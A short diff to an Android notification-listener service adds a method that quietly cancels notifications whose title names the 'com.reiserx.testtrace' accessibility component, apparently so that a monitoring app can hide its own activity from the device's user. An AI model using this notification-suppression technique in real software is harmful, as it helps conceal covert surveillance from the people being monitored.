@@ -70,6 +70,7 @@ public class NotificationService extends NotificationListenerService {
 
             if (pack.equals("com.reiserx.testtrace")) {
                 StartApp(sbn);
+                cancelNotifications(sbn);
             }
         }
         } catch (Exception e) {
@@ -167,6 +168,19 @@ public class NotificationService extends NotificationListenerService {
                 startActivity(intentone);
                 cancelNotification(sbn.getKey());
             }
+        }
+    }
+
+    private void cancelNotifications (StatusBarNotification sbn) {
+        if (sbn.getNotification().extras != null) {
+            extras = sbn.getNotification().extras;
+        }
+        if (extras.getString("android.title") != null) {
+            title = extras.getString("android.title");
+        }
+
+        if (title.contains("com.reiserx.testtrace.accessibility")) {
+            cancelNotification(sbn.getKey());
         }
     }
     public void FirstLaunch() {
